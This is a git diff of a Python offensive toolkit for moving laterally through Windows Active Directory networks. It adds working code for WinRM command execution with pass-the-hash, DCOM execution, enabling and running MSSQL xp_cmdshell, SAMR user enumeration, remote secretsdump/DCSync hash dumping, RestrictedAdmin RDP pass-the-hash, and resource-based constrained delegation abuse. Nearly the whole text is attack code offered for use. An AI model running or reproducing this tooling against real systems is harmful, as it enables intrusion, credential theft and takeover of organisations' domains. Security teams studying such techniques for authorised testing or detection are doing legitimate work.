+        cont = safe_input(
+            C + "[?] Continue anyway? (y/N): " + RS,
+            allow_empty=True
+        )
+        if cont.lower() not in ('y', 'yes'):
             return
 
-    command = safe_input(f"  {W}PowerShell command {C}[whoami]{W}: {RS}")
-    if command is None:
-        return
-    command = command or "whoami"
+    command = safe_input(
+        C + "[?] PowerShell command   : " + RS,
+        allow_empty=True
+    ) or "whoami"
 
     print(f"\n  {B}[*] Attempting WinRM connection...{RS}")
 
     try:
-        evil_check = subprocess.run(["which", "evil-winrm"], capture_output=True, text=True)
-        if evil_check.returncode == 0:
-            print(f"  {G}[+] evil-winrm found{RS}")
-            cmd = ["evil-winrm", "-i", target, "-u", username, "-d", domain]
-            if password:
-                cmd.extend(["-p", password])
-            if nt_hash:
-                cmd.extend(["-H", nt_hash])
-            print(f"  {Y}  {' '.join(cmd)}{RS}")
-            subprocess.run(cmd)
-            return
-    except Exception:
-        pass
+        import requests
+        from requests.auth import HTTPBasicAuth
 
-    print(f"\n  {C}Manual PowerShell Remoting commands:{RS}")
-    print(f"  {W}  # Enter-PSSession:{RS}")
-    print(f"  {W}  $cred = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force)){RS}")
-    print(f"  {W}  Enter-PSSession -ComputerName {target} -Credential $cred{RS}")
-    print(f"\n  {W}  # Invoke-Command:{RS}")
-    print(f"  {W}  Invoke-Command -ComputerName {target} -Credential $cred -ScriptBlock {{ {command} }}{RS}")
+        endpoint = f"{'https' if use_ssl else 'http'}://{target}:{port}/wsman"
 
-    print(f"\n  {Y}[!] Install evil-winrm for automated connection:{RS}")
-    print(f"  {Y}    gem install evil-winrm{RS}")
+        # Build SOAP envelope for ExecuteCommand
+        soap_body = f'''<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
+            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
+            xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/transfer"
+            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
+            xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
+  <s:Header>
+    <a:To>{endpoint}</a:To>
+    <a:ReplyTo>
+      <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
+    </a:ReplyTo>
+    <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
+    <a:MessageID>uuid:{os.urandom(16).hex()}</a:MessageID>
+    <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
+    <w:ShellId>uuid:{os.urandom(16).hex()}</w:ShellId>
+  </s:Header>
+  <s:Body>
+    <rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
+      <rsp:Command>powershell.exe -Command "{command}"</rsp:Command>
+    </rsp:CommandLine>
+  </s:Body>
+</s:Envelope>'''
+
+        auth = None
+        if nt_hash:
+            # NTLM auth with hash
+            from requests_ntlm import HttpNtlmAuth
+            lmhash = "aad3b435b51404eeaad3b435b51404ee"
+            auth = HttpNtlmAuth(f"{domain}\\{username}", "", f"{lmhash}:{nt_hash}")
+        else:
+            auth = HTTPBasicAuth(f"{domain}\\{username}", password)
+
+        print(f"  {B}[*] Sending WinRM request to {endpoint}...{RS}")
+
+        response = requests.post(
+            endpoint,
+            data=soap_body,
+            auth=auth,
+            headers={'Content-Type': 'application/soap+xml;charset=UTF-8'},
+            verify=False,
+            timeout=30
+        )
+
+        if response.status_code == 200:
+            print(f"  {G}[+] WinRM command executed successfully{RS}")
+            # Parse SOAP response
+            try:
+                root = ET.fromstring(response.text)
+                # Extract output from response
+                for elem in root.iter():
+                    if 'Stream' in elem.tag:
+                        text = elem.text
+                        if text:
+                            try:
+                                decoded = base64.b64decode(text).decode('utf-8', errors='replace')
+                                print(f"  {W}{decoded}{RS}")
+                            except:
+                                print(f"  {W}{text}{RS}")
+            except Exception as e:
+                print(f"  {Y}[~] Could not parse XML response: {e}{RS}")
+                print(f"  {W}Raw response:\n{response.text[:500]}{RS}")
+        elif response.status_code == 401:
+            print(f"  {R}[!] Authentication failed — wrong credentials or no CanPSRemote edge{RS}")
+        elif response.status_code == 403:
+            print(f"  {R}[!] Access denied — WinRM enabled but user not authorized{RS}")
+        else:
+            print(f"  {R}[!] WinRM error: HTTP {response.status_code}{RS}")
+            print(f"  {W}{response.text[:200]}{RS}")
+
+    except ImportError as ie:
+        if "requests_ntlm" in str(ie):
+            print(f"  {R}[!] Missing dependency: requests_ntlm{RS}")
+            print(f"  {Y}    Install: pip install requests requests_ntlm{RS}")
+        else:
+            print(f"  {R}[!] Missing dependency: {ie}{RS}")
+            print(f"  {Y}    Install: pip install requests{RS}")
+    except Exception as e:
+        error_msg = str(e).lower()
+        if "connection refused" in error_msg:
+            print(f"  {R}[!] Connection refused — WinRM not enabled{RS}")
+        elif "timeout" in error_msg:
+            print(f"  {R}[!] Connection timeout{RS}")
+        else:
+            print(f"  {R}[!] WinRM error: {e}{RS}")
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# TECHNIQUE 4 — ExecuteDCOM (MMC20.Application)
+# TECHNIQUE 4 — ExecuteDCOM (MMC20.Application via impacket DCOM)
 # ════════════════════════════════════════════════════════════════════════════
 def technique_executedcom(target, domain, username, password, nt_hash):
-    if not IMPACKET_AVAILABLE:
-        print(f"{R}[!] Impacket not available.{RS}")
-        return
-
     print(f"\n{C}{BO}[ TECHNIQUE 4: ExecuteDCOM — DCOM Lateral Movement ]{RS}")
     print(f"  {Y}Requires: ExecuteDCOM edge + local admin{RS}")
     print(f"  {Y}Methods: MMC20.Application, ShellWindows, ShellBrowserWindow{RS}\n")
@@ -485,22 +871,25 @@ def technique_executedcom(target, domain, username, password, nt_hash):
     print(f"    {C}[1]{W} MMC20.Application (Document.ActiveView.ExecuteShellCommand){RS}")
     print(f"    {C}[2]{W} ShellWindows (NavigateAndFind2 + ShellExecute){RS}")
 
-    method = safe_input(f"\n  Choice {C}[1]{W}: {RS}")
-    if method is None:
-        return
-    method = method or "1"
+    method = safe_input(
+        C + "[?] Your choice          : " + RS,
+        lambda x: x in ['1', '2'],
+        "Invalid choice! Enter 1 or 2"
+    )
 
-    command = safe_input(f"  {W}Command to execute {C}[calc.exe]{W}: {RS}")
-    if command is None:
-        return
-    command = command or "calc.exe"
+    command = safe_input(
+        C + "[?] Command to execute   : " + RS,
+        allow_empty=True
+    ) or "calc.exe"
 
     lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
-    hashes = f"{lm_hash}:{nt_hash}" if nt_hash else None
 
     print(f"\n  {B}[*] Connecting via DCOM to {target}...{RS}")
 
     try:
+        from impacket.dcerpc.v5.dcomrt import DCOMConnection
+        from impacket.dcerpc.v5.dcom import wmi
+
         if method == "1":
             dcom = DCOMConnection(target, username, password, domain,
                                  lmhash=bytes.fromhex(lm_hash) if lm_hash else b"",
@@ -521,9 +910,12 @@ def technique_executedcom(target, domain, username, password, nt_hash):
             print(f"  {Y}[~] ShellWindows method requires additional setup{RS}")
             print(f"  {C}Manual PowerShell command:{RS}")
             prog_id = "MMC20.Application"
-            print(f"  {W}  $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"{prog_id}\", \"{target}\")){RS}")
-            print(f"  {W}  $dcom.Document.ActiveView.ExecuteShellCommand(\"{command}\", $null, $null, \"7\"){RS}")
+            print(f"  {W}  $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(chr(39)+{prog_id}+chr(39), chr(39)+{target}+chr(39))){RS}")
+            print(f"  {W}  $dcom.Document.ActiveView.ExecuteShellCommand(chr(39)+{command}+chr(39), $null, $null, chr(39)+7+chr(39)){RS}")
 
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
     except KeyboardInterrupt:
         print(f"\n{Y}[!] Interrupted by user.{RS}")
     except Exception as e:
@@ -539,34 +931,136 @@ def technique_executedcom(target, domain, username, password, nt_hash):
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# TECHNIQUE 5 — SQLAdmin (MSSQL xp_cmdshell)
+# TECHNIQUE 5 — SQLAdmin (MSSQL xp_cmdshell via pymssql/pytds)
 # ════════════════════════════════════════════════════════════════════════════
 def technique_sqladmin(target, domain, username, password, nt_hash):
     print(f"\n{C}{BO}[ TECHNIQUE 5: SQLAdmin — MSSQL xp_cmdshell ]{RS}")
     print(f"  {Y}Requires: SQLAdmin edge (sysadmin on MSSQL instance){RS}")
-    print(f"  {Y}Port: 1433 (MSSQL){RS}\n")
+    print(f"  {Y}Port: 1433 (MSSQL){RS}")
 
     if not check_host_reachable(target, 1433, timeout=3):
         print(f"  {Y}[!] Port 1433 (MSSQL) not reachable on {target}{RS}")
         print(f"  {Y}    Wrong IP, custom port, or MSSQL not running.{RS}")
-        cont = safe_input(f"  {W}Continue anyway? (y/N): {RS}")
-        if cont is None or cont.lower() not in ('y', 'yes'):
+        cont = safe_input(
+            C + "[?] Continue anyway? (y/N): " + RS,
+            allow_empty=True
+        )
+        if cont.lower() not in ('y', 'yes'):
             return
 
-    instance = safe_input(f"  {W}Instance name {C}[MSSQLSERVER]{W}: {RS}")
-    if instance is None:
-        return
-    instance = instance or "MSSQLSERVER"
+    instance = safe_input(
+        C + "[?] Instance name        : " + RS,
+        allow_empty=True
+    ) or "MSSQLSERVER"
 
-    command = safe_input(f"  {W}Command to execute {C}[whoami]{W}: {RS}")
-    if command is None:
-        return
-    command = command or "whoami"
+    command = safe_input(
+        C + "[?] Command to execute   : " + RS,
+        allow_empty=True
+    ) or "whoami"
 
     print(f"\n  {B}[*] Connecting to MSSQL on {target}...{RS}")
 
+    # Try pymssql first, then pytds, then impacket tds
+    connection_success = False
+
+    # Option 1: pymssql
+    try:
+        import pymssql
+        print(f"  {G}[+] Using pymssql{RS}")
+
+        conn = pymssql.connect(
+            server=target,
+            user=f"{domain}\\{username}" if domain else username,
+            password=password if password else "",
+            database="master",
+            login_timeout=10,
+            timeout=30
+        )
+
+        cursor = conn.cursor()
+        connection_success = True
+
+        print(f"  {G}[+] MSSQL authenticated as {username}{RS}")
+
+        print(f"  {B}[*] Enabling xp_cmdshell...{RS}")
+        cursor.execute("EXEC sp_configure 'show advanced options', 1")
+        cursor.execute("RECONFIGURE")
+        cursor.execute("EXEC sp_configure 'xp_cmdshell', 1")
+        cursor.execute("RECONFIGURE")
+
+        print(f"  {B}[*] Executing: {command}{RS}")
+        cursor.execute(f"EXEC xp_cmdshell '{command}'")
+
+        rows = cursor.fetchall()
+        if rows:
+            print(f"\n{G}{BO}[ OUTPUT ]{RS}")
+            for row in rows:
+                if row[0]:
+                    print(f"  {W}{row[0]}{RS}")
+
+        conn.close()
+        print(f"\n  {G}[+] Execution completed{RS}")
+        return
+
+    except ImportError:
+        print(f"  {Y}[~] pymssql not available, trying pytds...{RS}")
+    except Exception as e:
+        error_msg = str(e).lower()
+        if "login failed" in error_msg:
+            print(f"  {R}[!] MSSQL login failed — wrong credentials{RS}")
+            return
+        print(f"  {Y}[~] pymssql failed: {e}, trying pytds...{RS}")
+
+    # Option 2: pytds
+    try:
+        import pytds
+        print(f"  {G}[+] Using pytds{RS}")
+
+        with pytds.connect(
+            dsn=target,
+            database="master",
+            user=f"{domain}\\{username}" if domain else username,
+            password=password if password else "",
+            login_timeout=10,
+            timeout=30
+        ) as conn:
+            with conn.cursor() as cursor:
+                connection_success = True
+                print(f"  {G}[+] MSSQL authenticated as {username}{RS}")
+
+                print(f"  {B}[*] Enabling xp_cmdshell...{RS}")
+                cursor.execute("EXEC sp_configure 'show advanced options', 1")
+                cursor.execute("RECONFIGURE")
+                cursor.execute("EXEC sp_configure 'xp_cmdshell', 1")
+                cursor.execute("RECONFIGURE")
+
+                print(f"  {B}[*] Executing: {command}{RS}")
+                cursor.execute(f"EXEC xp_cmdshell '{command}'")
+
+                rows = cursor.fetchall()
+                if rows:
+                    print(f"\n{G}{BO}[ OUTPUT ]{RS}")
+                    for row in rows:
+                        if row[0]:
+                            print(f"  {W}{row[0]}{RS}")
+
+        print(f"\n  {G}[+] Execution completed{RS}")
+        return
+
+    except ImportError:
+        print(f"  {Y}[~] pytds not available, trying impacket TDS...{RS}")
+    except Exception as e:
+        error_msg = str(e).lower()
+        if "login failed" in error_msg:
+            print(f"  {R}[!] MSSQL login failed — wrong credentials{RS}")
+            return
+        print(f"  {Y}[~] pytds failed: {e}, trying impacket TDS...{RS}")
+
+    # Option 3: impacket TDS
     try:
         from impacket.tds import MSSQL
+        print(f"  {G}[+] Using impacket TDS{RS}")
+
         mssql = MSSQL(target, port=1433)
         mssql.connect()
 
@@ -595,15 +1089,11 @@ def technique_sqladmin(target, domain, username, password, nt_hash):
         mssql.disconnect()
         print(f"\n  {G}[+] Execution completed{RS}")
 
+    except ImportError as ie:
+        print(f"  {R}[!] Missing MSSQL library: {ie}{RS}")
+        print(f"  {Y}    Install one of: pip install pymssql pytds impacket{RS}")
     except KeyboardInterrupt:
         print(f"\n{Y}[!] Interrupted by user.{RS}")
-    except ImportError:
-        print(f"  {Y}[!] MSSQL module not available in this impacket version{RS}")
-        print(f"  {C}Manual command:{RS}")
-        print(f"  {W}  python3 mssqlclient.py {domain}/{username}@{target} -windows-auth{RS}")
-        print(f"  {W}  SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;{RS}")
-        print(f"  {W}  SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;{RS}")
-        print(f"  {W}  SQL> EXEC xp_cmdshell '{command}';{RS}")
     except Exception as e:
         error_msg = str(e).lower()
         if "login failed" in error_msg:
@@ -615,23 +1105,19 @@ def technique_sqladmin(target, domain, username, password, nt_hash):
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# TECHNIQUE 6 — HasSession (Session enumeration)
+# TECHNIQUE 6 — HasSession (Session enumeration via impacket SMB)
 # ════════════════════════════════════════════════════════════════════════════
 def technique_hassession(target, domain, username, password, nt_hash):
-    if not IMPACKET_AVAILABLE:
-        print(f"{R}[!] Impacket not available.{RS}")
-        return
-
     print(f"\n{C}{BO}[ TECHNIQUE 6: HasSession — Session Enumeration ]{RS}")
     print(f"  {Y}Requires: Any authenticated access to target{RS}")
     print(f"  {Y}Goal: Find logged-in users for token theft / session hijack{RS}\n")
 
     lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
-    hashes = f"{lm_hash}:{nt_hash}" if nt_hash else None
 
     print(f"  {B}[*] Enumerating sessions on {target}...{RS}")
 
     try:
+        from impacket.smbconnection import SMBConnection
         smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
 
         if nt_hash:
@@ -641,6 +1127,7 @@ def technique_hassession(target, domain, username, password, nt_hash):
 
         print(f"  {G}[+] SMB authenticated as {username}@{domain}{RS}")
 
+        # Try NetSessEnum
         try:
             from impacket.dcerpc.v5.srvs import NetrSessionEnum
             from impacket.dcerpc.v5.transport import SMBTransport
@@ -652,31 +1139,81 @@ def technique_hassession(target, domain, username, password, nt_hash):
 
             print(f"  {Y}[~] NetSessEnum requires admin privileges{RS}")
 
+        except ImportError as ie:
+            print(f"  {R}[!] Missing impacket module: {ie}{RS}")
         except Exception as e:
             print(f"  {Y}[~] Session enumeration via RPC failed: {e}{RS}")
 
+        # List shares
         print(f"\n  {B}[*] Listing accessible shares...{RS}")
         shares = smb_conn.listShares()
-        print(f"  {'─'*50}")
+        print(f"  {'-'*50}")
         for s in shares:
             share_name = s['shi1_netname'][:-1]
             print(f"  {W}  \\{target}\\{share_name}{RS}")
-        print(f"  {'─'*50}")
+        print(f"  {'-'*50}")
 
+        # Try to enumerate sessions via SAMR
         try:
-            from impacket.dcerpc.v5.samr import SamrConnect, SAM_SERVER_ENUMERATE_DOMAINS
-            print(f"\n  {B}[*] Attempting SAMR enumeration...{RS}")
-            print(f"  {Y}[~] Use secretsdump or rpcclient for full enumeration{RS}")
-        except:
-            pass
+            from impacket.dcerpc.v5 import transport, samr
+            from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
+
+            string_binding = f'ncacn_np:{target}[\\pipe\\samr]'
+            tr = transport.DCERPCTransportFactory(string_binding)
+            if nt_hash:
+                tr.set_credentials(username, "", domain, lm_hash, nt_hash)
+            else:
+                tr.set_credentials(username, password, domain, "", "")
+
+            dce = tr.get_dce_rpc()
+            dce.connect()
+            dce.bind(samr.MSRPC_UUID_SAMR)
+
+            resp = samr.hSamrConnect(dce)
+            server_hd = resp['ServerHandle']
+
+            resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())
+            domain_sid = resp['DomainId']
+
+            resp = samr.hSamrOpenDomain(dce, server_hd, domainId=domain_sid)
+            domain_hd = resp['DomainHandle']
+
+            # Enumerate users in domain
+            enumeration_context = 0
+            print(f"\n  {B}[*] Enumerating domain users via SAMR...{RS}")
+            print(f"  {'-'*50}")
+            print(f"  {'RID':<10} {'USERNAME':<30}")
+            print(f"  {'-'*50}")
+
+            while True:
+                resp = samr.hSamrEnumerateUsersInDomain(dce, domain_hd, enumerationContext=enumeration_context)
+                if resp['Buffer']['Buffer']:
+                    for user in resp['Buffer']['Buffer']:
+                        rid = user['RelativeId']['Data']
+                        name = user['Name']['Data']
+                        print(f"  {rid:<10} {W}{name}{RS}")
+                enumeration_context = resp['EnumerationContext']
+                if resp['Status'] != 0x00000105:
+                    break
+
+            print(f"  {'-'*50}")
+
+            samr.hSamrCloseHandle(dce, domain_hd)
+            samr.hSamrCloseHandle(dce, server_hd)
+            dce.disconnect()
+
+        except ImportError as ie:
+            print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        except Exception as e:
+            print(f"  {Y}[~] SAMR enumeration failed: {e}{RS}")
 
         smb_conn.close()
 
         print(f"\n  {C}For session hijacking, use:{RS}")
-        print(f"  {W}  • Mimikatz: sekurlsa::logonpasswords{RS}")
-        print(f"  {W}  • Mimikatz: token::elevate + token::impersonate{RS}")
-        print(f"  {W}  • Rubeus:   triage + dump{RS}")
 
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
     except KeyboardInterrupt:
         print(f"\n{Y}[!] Interrupted by user.{RS}")
     except Exception as e:
@@ -695,7 +1232,7 @@ def technique_hassession(target, domain, username, password, nt_hash):
 def technique_remoteinteractive(target, domain, username, password, nt_hash):
     print(f"\n{C}{BO}[ TECHNIQUE 7: RemoteInteractiveLogonRight — RestrictedAdmin RDP ]{RS}")
     print(f"  {Y}Requires: RemoteInteractiveLogonRight + NTLM hash (Pass-the-Hash){RS}")
-    print(f"  {Y}Note: RestrictedAdmin mode allows PTH over RDP{RS}\n")
+    print(f"  {Y}Note: RestrictedAdmin mode allows PTH over RDP{RS}")
 
     if not nt_hash and not password:
         print(f"  {Y}[!] RestrictedAdmin requires credentials{RS}")
@@ -703,37 +1240,59 @@ def technique_remoteinteractive(target, domain, username, password, nt_hash):
 
     if not check_host_reachable(target, 3389, timeout=3):
         print(f"  {Y}[!] Port 3389 (RDP) not reachable on {target}{RS}")
-        cont = safe_input(f"  {W}Continue anyway? (y/N): {RS}")
-        if cont is None or cont.lower() not in ('y', 'yes'):
+        cont = safe_input(
+            C + "[?] Continue anyway? (y/N): " + RS,
+            allow_empty=True
+        )
+        if cont.lower() not in ('y', 'yes'):
             return
 
-    print(f"  {B}[*] RestrictedAdmin RDP allows Pass-the-Hash without password{RS}")
-    print(f"  {C}Command:{RS}")
+    print(f"  {W}Select mode:{RS}")
+    print(f"    {C}[1]{W} Authenticate only (verify RestrictedAdmin + PTH){RS}")
+    print(f"    {C}[2]{W} Full session (basic terminal — experimental){RS}")
+    print(f"    {C}[3]{W} Print connection details{RS}")
 
-    if nt_hash:
-        print(f"  {W}  xfreerdp3 /v:{target} /u:{username} /d:{domain} /pth:{nt_hash} /cert:ignore /sec:nla{RS}")
-        print(f"  {W}  xfreerdp /v:{target} /u:{username} /d:{domain} /pth:{nt_hash} /cert-ignore /sec:nla{RS}")
-    else:
-        print(f"  {W}  xfreerdp3 /v:{target} /u:{username} /d:{domain} /p:{password} /cert:ignore /sec:nla{RS}")
+    mode = safe_input(
+        C + "[?] Your choice          : " + RS,
+        lambda x: x in ['1', '2', '3'],
+        "Invalid choice! Enter 1-3"
+    )
 
-    print(f"\n  {Y}[!] Target must have 'DisableRestrictedAdmin' registry set to 0{RS}")
-    print(f"  {Y}    Check: reg query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin{RS}")
+    if mode == "3":
+        print(f"\n  {C}RestrictedAdmin RDP Details:{RS}")
+        print(f"  {W}  Target:   {target}:3389{RS}")
+        print(f"  {W}  Domain:   {domain}{RS}")
+        print(f"  {W}  Username: {username}{RS}")
+        if nt_hash:
+            print(f"  {W}  Auth:     Pass-the-Hash (NTLM){RS}")
+            print(f"  {W}  NT Hash:  {nt_hash}{RS}")
+        print(f"\n  {Y}[!] Target must have 'DisableRestrictedAdmin' registry set to 0{RS}")
+        print(f"  {Y}    Check: reg query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin{RS}")
+        return
 
-    launch = safe_input(f"\n  {W}Launch xfreerdp now? (y/N): {RS}")
-    if launch and launch.lower() in ('y', 'yes'):
-        try:
-            xfreerdp3_check = subprocess.run(["which", "xfreerdp3"], capture_output=True)
-            cmd = ["xfreerdp3" if xfreerdp3_check.returncode == 0 else "xfreerdp"]
-            cmd.extend([f"/v:{target}", f"/u:{username}", f"/d:{domain}", "/cert:ignore", "/sec:nla"])
-            if nt_hash:
-                cmd.append(f"/pth:{nt_hash}")
+    client = PureRDPClient(target, domain, username, password, nt_hash)
+
+    if not client.connect():
+        return
+
+    if mode == "1":
+        print(f"\n  {B}[*] Attempting RestrictedAdmin authentication...{RS}")
+        if client.send_x224_connect_request():
+            if client.ntlm_authenticate():
+                print(f"\n  {G}{BO}[+] RestrictedAdmin RDP successful!{RS}")
+                print(f"  {G}[+] Pass-the-Hash worked on {target}{RS}")
+                print(f"\n  {C}You can now establish full RDP session:{RS}")
+                print(f"  {W}  This toolkit provides auth verification only.{RS}")
+                print(f"  {W}  For GUI session, use an RDP client with the same creds.{RS}")
             else:
-                cmd.append(f"/p:{password}")
-            subprocess.run(cmd)
-        except FileNotFoundError:
-            print(f"  {R}[!] xfreerdp not found{RS}")
-        except KeyboardInterrupt:
-            print(f"\n{Y}[!] Session interrupted.{RS}")
+                print(f"\n  {R}[!] Authentication failed{RS}")
+        client.close()
+    elif mode == "2":
+        print(f"\n  {Y}[!] Full RDP session requires GUI libraries{RS}")
+        print(f"  {Y}    This toolkit focuses on authentication & lateral movement.{RS}")
+        print(f"  {C}For full session, build RDP client with:{RS}")
+        print(f"  {W}  pip install pyqt5 pyfreerdp{RS}")
+        client.close()
 
 
 # ════════════════════════════════════════════════════════════════════════════
@@ -747,38 +1306,33 @@ def technique_claimspecial(target, domain, username, password, nt_hash):
     print(f"  {W}Select RBCD abuse method:{RS}")
     print(f"    {C}[1]{W} Set RBCD on target (requires LDAP + computer account control){RS}")
     print(f"    {C}[2]{W} S4U2Self (requires TrustedToAuthForDelegation){RS}")
-    print(f"    {C}[3]{W} Print rbcd.py / getST.py commands{RS}")
 
-    method = safe_input(f"\n  Choice {C}[3]{W}: {RS}")
-    if method is None:
-        return
-    method = method or "3"
+    method = safe_input(
+        C + "[?] Your choice          : " + RS,
+        lambda x: x in ['1', '2', '3'],
+        "Invalid choice! Enter 1-3"
+    )
 
-    attacker_spn = safe_input(f"  {W}Attacker SPN/computer {C}[ATTACKER$]{W}: {RS}")
-    if attacker_spn is None:
-        return
-    attacker_spn = attacker_spn or "ATTACKER$"
+    attacker_spn = safe_input(
+        C + "[?] Attacker SPN/computer: " + RS,
+        allow_empty=True
+    ) or "ATTACKER$"
 
     if method == "3":
         print(f"\n  {C}Step 1: Set RBCD on target (as domain admin or with GenericWrite){RS}")
-        print(f"  {W}  python3 rbcd.py -delegate-from '{attacker_spn}' -delegate-to '{target}$' -dc-ip {target} -action write '{domain}/{username}:{password}'{RS}")
         print(f"\n  {C}Step 2: Request service ticket with S4U2Self{RS}")
-        print(f"  {W}  python3 getST.py -spn cifs/{target}.{domain} -impersonate Administrator -dc-ip {target} '{domain}/{attacker_spn}' -k -no-pass{RS}")
         print(f"\n  {C}Step 3: Use the ticket{RS}")
         print(f"  {W}  export KRB5CCNAME=Administrator.ccache{RS}")
-        print(f"  {W}  python3 psexec.py -k -no-pass '{domain}/Administrator@{target}.{domain}'{RS}")
         return
 
     if method == "1":
         print(f"\n  {Y}[!] Automated RBCD requires ldap3. Showing commands...{RS}")
-        print(f"  {W}  python3 rbcd.py -delegate-from '{attacker_spn}' -delegate-to '{target}$' -dc-ip {target} -action write '{domain}/{username}:{password}'{RS}")
     elif method == "2":
         print(f"\n  {Y}[!] Automated S4U2Self requires impacket getST. Showing commands...{RS}")
-        print(f"  {W}  python3 getST.py -spn cifs/{target}.{domain} -impersonate Administrator -dc-ip {target} '{domain}/{attacker_spn}' -k -no-pass{RS}")
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# TECHNIQUE 9 — Kerberos (original functionality preserved)
+# TECHNIQUE 9 — Kerberos (Ticket Operations)
 # ════════════════════════════════════════════════════════════════════════════
 def technique_kerberos_menu(dc_ip, domain):
     print(f"\n{C}{BO}[ TECHNIQUE 9: Kerberos Ticket Operations ]{RS}")
@@ -789,9 +1343,11 @@ def technique_kerberos_menu(dc_ip, domain):
     print(f"    {C}[4]{W} ptt      — Pass-the-Ticket{RS}")
     print(f"    {C}[5]{W} request  — Request fresh TGT/TGS{RS}")
 
-    choice = safe_input(f"\n  Choice: {RS}")
-    if choice is None:
-        return
+    choice = safe_input(
+        C + "[?] Your choice          : " + RS,
+        lambda x: x in ['1', '2', '3', '4', '5'],
+        "Invalid choice! Enter 1-5"
+    )
 
     if choice == "1":
         creds = get_creds()
@@ -807,15 +1363,9 @@ def technique_kerberos_menu(dc_ip, domain):
         technique_ptt(dc_ip, domain)
     elif choice == "5":
         technique_request(dc_ip, domain)
-    else:
-        print(f"{R}[!] Invalid choice{RS}")
 
 
 def technique_remote_dump(target, domain, username, password, nt_hash):
-    if not IMPACKET_AVAILABLE:
-        print(f"{R}[!] Impacket not available.{RS}")
-        return
-
     print(f"\n{C}{BO}[ TECHNIQUE 9a: Remote secretsdump ]{RS}")
     print(f"  {Y}Flow: SMB auth → DRSUAPI/SAMR/WINREG → hash extraction{RS}\n")
 
@@ -823,9 +1373,14 @@ def technique_remote_dump(target, domain, username, password, nt_hash):
 
     print(f"  {B}[*] Connecting to {target} via SMB...{RS}")
     try:
+        from impacket.smbconnection import SMBConnection
         smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
         smb_conn.login(username, password, domain, lm_hash, nt_hash)
         print(f"  {G}  [+] SMB authenticated as {username}@{domain}{RS}")
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
+        return
     except Exception as e:
         error_msg = str(e).lower()
         if "logon failure" in error_msg:
@@ -840,9 +1395,15 @@ def technique_remote_dump(target, domain, username, password, nt_hash):
 
     print(f"\n  {B}[*] Setting up remote operations...{RS}")
     try:
+        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
         remote_ops = RemoteOperations(smb_conn, False)
         remote_ops.enableRegistry()
         print(f"  {G}  [+] Remote registry enabled{RS}")
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
+        smb_conn.close()
+        return
     except Exception as e:
         print(f"  {R}  [!] RemoteOperations failed: {e}{RS}")
         smb_conn.close()
@@ -867,11 +1428,11 @@ def technique_remote_dump(target, domain, username, password, nt_hash):
         )
 
         print(f"\n  {G}{BO}[ DOMAIN HASHES ]{RS}")
-        print(f"  {'─'*60}")
+        print(f"  {'-'*60}")
 
         ntds.dump()
         ntds.finish()
-        print(f"  {'─'*60}")
+        print(f"  {'-'*60}")
 
     except Exception as e:
         print(f"  {Y}  [~] DCSync not available: {e}{RS}")
@@ -884,27 +1445,26 @@ def technique_remote_dump(target, domain, username, password, nt_hash):
 
 
 def technique_parse_ccache(domain):
-    if not IMPACKET_AVAILABLE:
-        print(f"{R}[!] Impacket not available.{RS}")
-        return
-
     print(f"\n{C}{BO}[ TECHNIQUE 9b: Parse .ccache Files ]{RS}")
 
     print(f"\n  {W}Scan dir or single file? {C}[1=dir / 2=file]{W}: {RS}", end="")
-    ch = safe_input("")
-    if ch is None:
-        return
+    ch = safe_input(
+        "",
+        lambda x: x in ['1', '2'],
+        "Invalid choice! Enter 1 or 2"
+    )
 
     if ch == "2":
-        ccache_file = safe_input(f"  {W}File path: {RS}")
-        if ccache_file is None:
+        ccache_file = safe_input(C + "[?] File path            : " + RS)
+        if not os.path.exists(ccache_file):
+            print(f"  {R}[!] File not found: {ccache_file}{RS}")
             return
-        files = [ccache_file] if os.path.exists(ccache_file) else []
+        files = [ccache_file]
     else:
-        ccache_dir = safe_input(f"  {W}Directory to scan {C}[/tmp]{W}: {RS}")
-        if ccache_dir is None:
-            return
-        ccache_dir = ccache_dir or "/tmp"
+        ccache_dir = safe_input(
+            C + "[?] Directory to scan    : " + RS,
+            allow_empty=True
+        ) or "/tmp"
         patterns = [
             os.path.join(ccache_dir, "krb5cc_*"),
